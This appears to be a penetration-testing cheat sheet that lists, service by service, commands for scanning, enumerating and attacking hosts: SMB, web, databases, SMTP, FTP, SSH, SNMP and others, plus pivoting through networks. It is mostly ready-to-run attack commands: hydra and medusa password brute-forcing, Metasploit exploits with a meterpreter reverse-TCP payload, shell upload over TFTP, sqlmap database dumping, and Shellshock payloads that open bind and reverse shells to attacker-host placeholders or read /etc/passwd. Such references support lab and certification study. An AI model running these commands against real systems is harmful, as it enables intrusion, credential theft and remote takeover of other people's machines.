# Network

## Scan for hosts

```text
nmap -sn $iprange -oG - | grep Up | cut -d' ' -f2 > network.txt
```

## Port scanning

### **TCP Top 1000:**

```text
nmap -Pn -sC -sV -oA tcp -vv $ip
```

### **All TCP Ports:**

```text
nmap -Pn -sC -sV -oA all -vv -p- $ip
```

{% hint style="success" %}
When you're getting no where with the TCP ports - try UDP ports. Easily forgotten about!
{% endhint %}

### **UDP Top 100:**

```text
nmap -Pn -sU --top-ports 100 -oA udp -vv $ip
```

### Utilize nmap's scripts

#### Find script related to a service your interested in, example here is ftp

```text
locate .nse | grep ftp
```

#### What does a script do?

```text
nmap --script-help ftp-anon
```

### Uniscan

```text
uniscan -u $ip -qweds
```

## Vulnerability scanning

### Search services vulnerabilities

```text
searchsploit --exclude=dos -t apache 2.2.3
```

```text
msfconsole; > search apache 2.2.3
```

## DNS

Find name servers

```text
host -t ns $ip
```

Find email servers

```text
host -t mx $ip
```

Subdomain bruteforcing

```text
for ip in $(cat list.txt); do host $ip.$website; done
```

Reverse dns lookup bruteforcing

```text
for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"
```

Zone transfer request

```text
host -l $ip ns1.$ip
```

```text
dnsrecon -d $ip -t axfr
```

Finds nameservers for a given domain

```text
host -t ns $ip| cut -d " " -f 4 #
```

```text
dnsenum $ip
```

Nmap zone transfer scan

```text
nmap $ip --script=dns-zone-transfer -p 53
```

Finds the domain names for a host.

```text
whois $ip
```

Find the IP and authoritative servers.

```text
nslookup $ip
```

Finds miss configure DNS entries.

```text
host -t ns $ip
```

TheHarvester finds subdomains in google, bing, etc

```text
python theHarvester.py  -l 500 -b all -d $ip
```

## SMB and SAMBA

Server Message Block \(**SMB**\) Protocol is a network file sharing protocol, and as implemented in Microsoft **Windows**

**Samba** has provided secure, stable and fast file and print services for all clients using the SMB/CIFS protocol, such as all versions of DOS and Windows, OS/2, Linux and many others

|  SMB Version |  Windows version |
| :--- | :--- |
|  CIFS  |  Microsoft Windows NT 4.0 |
|  SMB 1.0 |  Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2 |
|  SMB 2.0 |  Windows Vista & Windows Server 2008 |
|  SMB 2.1 |  Windows 7 and Windows Server 2008 R2 |
|  SMB 3.0 |  Windows 8 and Windows Server 2012 |
|  SMB 3.0.2 |  Windows 8.1 and Windows Server 2012 R2 |
|  SMB 3.1.1 |  Windows 10 and Windows Server 2016 |

#### SMB uses the following TCP and UDP ports:

```text
netbios-ns 137/tcp # NETBIOS Name Service
netbios-ns 137/udp
netbios-dgm 138/tcp # NETBIOS Datagram Service
netbios-dgm 138/udp
netbios-ssn 139/tcp # NETBIOS session service
netbios-ssn 139/udp
microsoft-ds 445/tcp # if you are using Active Directory
```

### Enumeration

mblookup — NetBIOS over TCP/IP client used to lookup NetBIOS names

### Samba version checker

#### smbver.sh

```text
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1 
```

```text
nmblookup -A $ip
```

```text
enum4linux -a $ip
```

Used to enumerate data from Windows and Samba hosts and is a wrapper for `smbclient`, `rpcclient`, `net` and `nmblookup`

{% hint style="info" %}
Look for users, groups, shares, workgroup/domains and password policies
{% endhint %}

list smb nmap scripts

```text
locate .nse | grep smb
```

### find SAMBA version number using the SMB OS discovery script:

```text
nmap -A $ip -p139
```

then google to see if version is vulnerable

```text
SAMBA 3.x-4.x #  vulnerable to linux/samba/is_known_pipename
SAMBA 3.5.11 # vulnerable to linux/samba/is_known_pipename
```

### smbmap

```text
smbmap -H $ip
```

```text
smbmap -R $sharename -H $ip #Recursively list dirs, and files
```

```text
smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q #downloads a file in quiet mode
```

#### Download all 

```text
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
```

{% hint style="info" %}
downloads to the `/usr/share/smbmap` directory
{% endhint %}

generally works a bit better than enum4linux as it enum4linux tends to error out a bit

{% hint style="success" %}
Ippsec using this tool  
[https://www.youtube.com/watch?v=jUc1J31DNdw&t=445s](https://www.youtube.com/watch?v=jUc1J31DNdw&t=445s)
{% endhint %}

#### Brute force login

```text
medusa -h $ip -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $ip  -vvvv
```

### Null Session

A null SMB session can be used to gather passwords and useful information from SMB 1 by looking in shares that are not password protected for interesting files. Windows NT/2000 XP default settings allow this. Windows 2003/XP SP2 SMB this behaviour is disabled.

#### Null session and extract information.

```text
nbtscan -r $ip
```

#### Version

```text
msfconsole; use auxiliary/scanner/smb/smb_version; set RHOSTS $ip; run
```

MultiExploit

```text
msfconsole; use exploit/multi/samba/usermap_script; set lhost 10.10.14.x; set rhost $ip; run
```

#### Show all nmap SMB scripts

```text
ls -ls /usr/share/nmap/scripts/smb*
```

Quick enum:

```text
nmap --script=smb-enum* --script-args=unsafe=1 -T5 $ip
```

Quick vuln scan:

```text
nmap --script=smb-vuln* --script-args=unsafe=1 -T5 $ip
```

Full enum and vuln scanning:

```text
nmap --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery --script-args=unsafe=1 -T5 $ip
```

Full enum & vuln scan:

```text
nmap -p139,445 -T4 -oN smb_vulns.txt -Pn --script 'not brute and not dos and smb-*' -vv -d $ip
```

Mount:

```text
smbclient //$ip/share -U username
```

Anonymous mount:

```text
smbclient //$ip/share # hit enter with blank password
```

### Eternal Blue

Exploits a critical vulnerability in the SMBv1 protocol

{% hint style="success" %}
Worth testing Eternal blue - you might get lucky although \(the system should be patched to fix this\)
{% endhint %}

### Vulnerable versions

Windows 7, 8, 8.1 and Windows Server 2003/2008/2012\(R2\)/2016

```text
nmap -p 445 $ip --script=smb-vuln-ms17-010
```

Bruteforce

```text
hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 $ip smb
```

Any metasploit exploit through Netbios over TCP in 139, you need to set:

```text
set SMBDirect false
```

## NFS

* Show all mounts

  ```text
  showmount -e $ip
  ```

* Mount a NFS share

  ```text
  mount $ip:/vol/share /mnt/nfs
  ```

## Web

```
nikto -h $ip
nikto -h $ip -p 80,8080,1234 #test different ports with one scan
```

```text
-Tuning Options
0 – File Upload
1 – Interesting File / Seen in logs
2 – Misconfiguration / Default File
3 – Information Disclosure
4 – Injection (XSS/Script/HTML)
5 – Remote File Retrieval – Inside Web Root
6 – Denial of Service
7 – Remote File Retrieval – Server Wide
8 – Command Execution / Remote Shell
9 – SQL Injection
a – Authentication Bypass
b – Software Identification
c – Remote Source Inclusion
x – Reverse Tuning Options (i.e., include all except specified)
```

```text
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/Top1000-RobotsDisallowed.txt; gobuster -u http://$ip -w Top1000-RobotsDisallowed.txt
```

### Directory Discovery

{% hint style="info" %}
use a few different files, check seclists for web discovery 
{% endhint %}

```text
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200 http://$ip/FUZZ
```

{% hint style="info" %}
It is worth scanning using a good number of word lists as well as scanning the directories recursively - which takes time.   
  
Its good to refer back to your findings when you're stuck. It may help you find where shells have been uploaded to.
{% endhint %}

```text
https://github.com/PinkP4nther
#follow guide, might have to run these commands if guide doesnt work then re run guideapt install cargo, apt install pkg-config
./erodir -u http:/$ip -e /usr/share/wordlists/dirb/common.txt -t 20
```

```text
gobuster -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e
```

```text
dirb http://$ip /usr/share/wordlists/dirb/common.txt
```

{% hint style="info" %}
works recursively
{% endhint %}

```text
gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip
```

```text
gobuster -u http://$ip/  -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e
```

```text
gobuster -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s '200,204,403,500' -e
```

```text
cd /root/dirsearch; python3 dirsearch.py  -u http://$ip/ -e .php
```

#### If really stuck run this

```text
for file in $(ls /usr/share/seclists/Discovery/Web-Content); do gobuster -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/$file -e -k -l -s "200,204,301,302,307" -t 20 ; done
```

#### Banner grabbing

```text
./whatweb $ip # identifies all known services
```

#### Methods testing

```text
nmap --script http-methods --script-args http-methods.url-path='/test' $ip
```

#### Brute Forcing authentication

```text
hydra 10.0.0.1 http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyou.txt -l admin
```

#### Vulnerability scanning:

```text
nikto -host http://$ip
```

```text
nmap --script=http-vuln* $ip 
```

#### Test against SQLI

```text
sqlmap -u "http://$ip/?query" --data="user=foo&pass=bar&submit=Login" --level=5 --risk=3 --dbms=mysql  
```

#### Coldfusion vulnerability scanning

```text
nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip
```

#### Brute force basic auth

```text
hydra -l user -P /usr/share/wordlists/rockyou.txt -f $ip http-get /path
```

{% hint style="info" %}
If you can **register yourself** on the site like a normal users - do this. There maybe an upload feature of the site which you can take advantage of.
{% endhint %}

### WebDav

Test for it

```text
davtest -move -sendbd auto -url http://$ip:8080/webdav/
```

```text
cadaver http://$ip:8080/webdav/
```

## Mysql

* ```text
  nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ip -p 3306
  ```

#### Nmap scan

```text
nmap -sV -Pn -vv -script=mysql* $ip -p 3306
```

#### Vuln scanning:

```text
sqlmap -u 'http://$ip/login-off.asp' --method POST  --data 'txtLoginID=admin&txtPassword=aa&cmdSubmit=Login' --all --dump-all
```

If Mysql is running as root and you have access, you can run commands:

```text
mysql> select do_system('id');
mysql> \! sh
```

#### Enumerate MSSQL Servers on the network

```text
msf > use auxiliary/scanner/mssql/mssql_ping
nmap -sU --script=ms-sql-info $ip
```

#### Bruteforce MsSql

```text
msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login
```

#### Gain shell using gathered credentials

```text
msf > use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
```

#### Log in to a MsSql server:

```text
# root@kali:~/dirsearch# cat ../.freetds.conf
[someserver]
host = $ip
port = 1433
tds version = 8.0
user=sa

root@kali:~/dirsearch# sqsh -S someserver -U sa -P PASS -D DB_NAME
```

{% page-ref page="5-sql.md" %}

## SMTP

Always do users enumeration

```text
for server in $(cat smtpmachines); do echo "******************" $server "*****************"; smtp-user-enum -M VRFY -U userlist.txt -t $server;done #for multiple servers
```

```text
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
```

```text
use auxiliary/scanner/smtp/smtp_enum
```

Command to check if a user exists

```text
VRFY root
```

Command to ask the server if a user belongs to a mailing list

```text
EXPN root
```

Enumeration and vuln scanning:

```text
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip
```

#### Bruteforce

```text
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
```

#### Metasploit user enumeration

```text
use auxiliary/scanner/smtp/smtp_enum
```

#### Testing for open relay

```text
telnet $ip 25
EHLO root
MAIL FROM:root@target.com
RCPT TO:example@gmail.com
DATA
Subject: Testing open mail relay.
Testing SMTP open mail relay. Have a nice day.
.
QUIT
```

## RPC \(135\)

#### Enumerate, shows if any NFS mount exposed:

```text
rpcinfo -p $ip
```

```text
nmap $ip --script=msrpc-enum
```

```text
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

## FTP enumeration

#### Enumerate:

```text
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $ip
```

#### Bruteforce

```text
hydra -l user -P /usr/share/john/password.lst ftp://$ip:21
```

#### Bruteforce with metasploit

```text
msfconsole -q msf> search type:auxiliary login: msf> use auxiliary/scanner/ftp/ftp_login
```

#### Vuln scan

```text
nmap --script=ftp-* -p 21 $ip
```

### TFTP

If unauthenticated access is allowed with write permissions you can upload a shell:

```text
tftp $ip
tftp> ls
?Invalid command
tftp> verbose
Verbose mode on.
tftp> put shell.php
Sent 3605 bytes in 0.0 seconds [inf bits/sec]
```

```
nmap -sU -p 69 --script tftp-enum.nse $ip 
```

or

```text
use auxiliary/scanner/tftp/tftpbrute
```

`connecting/interacting:   
tftp $ip  
tftp> put payload.exe   
tftp> get file.txt`

## SSH

#### User enumeration

```text
use auxiliary/scanner/ssh/ssh_enumusers
set user_file /usr/share/wordlists/metasploit/unix_users.txt
or
set user_file /usr/share/seclists/Usernames/Names/names.txt
run
```

```text
python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt $ip
```

#### Bruteforce

```text
hydra -v -V -l root -P password-file.txt $ip ssh
```

#### With list of users:

```text
hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 192.168.33.251 ssh
```

* You can use **-w** to slow down

## SSL

#### Open a connection

```text
openssl s_client -connect $ip:443
```

#### Basic SSL ciphers check

```text
nmap --script ssl-enum-ciphers -p 443 $ip
```

* Look for unsafe ciphers such as Triple-DES and Blowfish
* Very complete tool for SSL auditing is testssl.sh, finds BEAST, FREAK, POODLE, heart bleed, etc...

## SNMP

### Enumeration

enumerateEommunity strings 

```text
./onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.11.1.73
```

{% hint style="danger" %}
Community string too long  
If you see this download onesixtyone from Github and run it there
{% endhint %}

#### v1

```
snmp-check -t $ip -c public
```

use nmap to enumerate info

```text
nmap -sU -p161 --script "snmp-*" $ip
```

### snmpwalk

```text
apt install snmp-mibs-downloader #translates MIBs into readable format
```

```text
for community in public private manager; do snmpwalk -c $community -v1 $ip; done
snmpwalk -c public -v1 $ip
snmpenum $ip public windows.txt
```

Less noisy:

```text
snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25
```

Based on UDP, stateless and susceptible to UDP spoofing

```text
nmap -sU --open -p 16110.1.1.1-254 -oG out.txt
```

```text
snmpwalk -c public -v1  10.1.1.1 # we need to know that there is a community called public
snmpwalk -c public -v1 192.168.11.204 1.3.6.1.4.1.77.1.2.25 # enumerate windows users
snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2 # enumerates running processes
```

```text
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $ip
```

## POP3

### Test authentication:

```text
telnet $ip 110
USER uer@$ip
PASS admin
list
retr 1
```

## Finger

### port 79

```text
https://touhidshaikh.com/blog/?p=914
```

### **Find Logged in users on target.**

```text
finger @$ip
if there is no user logged in this will show no username
```

#### **Check User is existed or not.**

```text
finger $username@$ip
```

The finger command is very useful for checking users on target but it’s painful if brute-forced for a username.

### Using Metasploit fo Brute-force target

```text
use auxiliary/scanner/finger/finger_users
set rhosts $ip
set users_file 
run
```

```text
cd /tmp/
wget http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
tar -xvf finger-user-enum-1.0.tar.gz
cd finger-user-enum-1.0
perl finger-user-enum.pl -t 10.22.1.11 -U /tmp/rockyou-top1000.txt
```

## RDP



#### Bruteforce

```text
ncrack -vv --user administrator -P password-file.txt rdp://$ip
```

```text
hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
```

## Kerberos

Test MS14-068

## LDAP

#### Enumeration:

```text
ldapsearch -h $ip -p 389 -x -b "dc=mywebsite,dc=com"
```

## Email addresses enumeration

Find emails in google, bing, pgp etc

```text
theharvester -d $ip -b google
```

Contact information for the domains they host

```text
whois $ip
```

Find emails and employee name with Recon-ng:

```text
recon-ng; use module; set DOMAIN $ip; run;
recon/contacts/gather/http/api/whois_pocs
```

Find xss published ad xssed.co

```text
recon/hosts/enum/http/web/xssed
```

Find subdomain

```text
recon/hosts/gather/http/web/google_site
```

Finds IPs close to the domain and possible new domains

```text
recon/hosts/gather/http/web/ip_neighbor
```

Google search

* site:xxx -site:www.xxx
* filetype: look for specific documents, pdf, docx, etc..
* inurl
* intitle
* Others https://www.exploit-db.com/google-hacking-database/

### nmap has many vulnerability scanning NSE scripts in /usr/share/nmap/scripts/

OpenVAS

* Powerful vulnerability scanner with thousands of scan checks. Setup:

```text
openvas-setup; openvas-adduser; gsd
```

## Well known exploits

### Shellshock

The following tool will test it.

```text
git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
```

You can also:

```text
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc $ip 80
```

```text
curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" $ip/cgi-bin/status
```

Shellshock over SSH:

```text
ssh username@$ip '() { :;}; /bin/bash'
```

Exploit shellshock via curl, use -k switch to force curl to bypass any SSL warnings. Replace the bash command with anything.

```text
curl http://192.168.123.123/path/to/cgi- bin/name_of_vuln_cgi -H "custom:() { ignored; }; /bin/bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1 "
```

### HeartBleed

Test web server

```text
sslscan $ip:443
```

### Internet explorer 6

Vulnerable to msf exploit\(ms10\_002\_aurora\)

## Tunneling your traffic through another host

* ```text
  sshuttle -r root@$ip 10.10.10.0/24
  ```

### Port forwarding

Simplest type of traffic redirection, consists on accepting traffic from one address and port port and redirecting it to another address and port.

It can be useful to bypass address and port based filters. Rinetd is a linux tool to do it.

### Local port forwarding

Creates an encrypted tunnel through two machines and have traffic redirected to a final host and port, similar to port forwarding This is useful when you are trying to connect from your machine to a destination using a gateway. The syntax is:

```text
ssh gateway_host -L local_port:remote_host:remote_port
```

You can later create a SSH session to the local port and have and SSH tunneled to destination:

```text
ssh hop_machine -L 31337:banned_machine:22
ssh -p 31337 localhost
```

### Remote port forwarding

It creates a tunnel from the target machine to your local machine, which allows connecting to an arbitrary port on the target. Useful if the target is in a non-routable network from your local machine. This is useful when you are trying to connect to a host, behind a firewall that blocks incoming connections. This technique works as the previous one, but the connection is started from the gateway. The syntax is:

```text
ssh <gateway> -R <remote port to bind>:<local host>:<local port>
```

### Dynamic Port Forwarding

Allows to create a tunnel from the target to your machine, and have the traffic routed to any host through target. You can configure a local port to forward traffic to multiple destinations passing through a single host. It is similar to local port forwarding but allows multiple destinations. It uses the SOCKS protocol. The syntax is:

```text
ssh -D local_port remote_add 
```

The connection of the previous command is established at port 22 of remote addr.

### Pivoting

1. drop 3proxy.exe

2. Set up a config file:

```text
allow *_
internal IP_SAME_NETWORK
external IP_OTHER_NETWORK
socks -p1081
```

3. Add to **/etc/proxychains.conf**:

```text
socks4  IP_SAME_NETWORK 1081
```

4. Scan:

```text
proxychains nmap -sT -Pn IP_OTHER_NETWORK-250 --top-ports=5
```

### Double-pivoting

Pivoting through two different networks:

First, create a dynamic port forwarding through the first network:

```text
ssh -f -N -D 9050 root@10.1.2.1
```

Edit **/etc/proxychains.conf** and add as default gateway:

```text
socks4 127.0.0.1 9050
```

Use the proxy to create a second dynamic port forward to the second network:

```text
proxychains ssh -f -N -D 10050 root@10.1.2.1 -p 22
```

Edit again **/etc/proxychains.conf** and add as default gateway:

```text
socks4 127.0.0.1 10050
```

* You can now use proxychains to pivot to the target network:

  ```text
  proxychains nmap -sTV -n -PN 10.1.2.1 -254
  ```

## CVEs

* ```text
  http://www.cvedetails.com/
  https://www.exploit-db.com/
  ```

## Word Lists

* ```text
  /usr/share/seclists/
  /usr/share/wordlist/
  /usr/share/metasploit-framework/data/wordlists/
  ```

Minimal web server

* ```text
  for i in 1 2 3 4 5 6 7; do echo -e '200 OK HTTP/1.1\r\nConnection:close\r\n\r\nfoo\r\n' |nc -q 0 -klvvp 80; done
  ```

## 

## Proxy

Protocols

```text
http://
http://
connect://
sock4://
sock5://
```

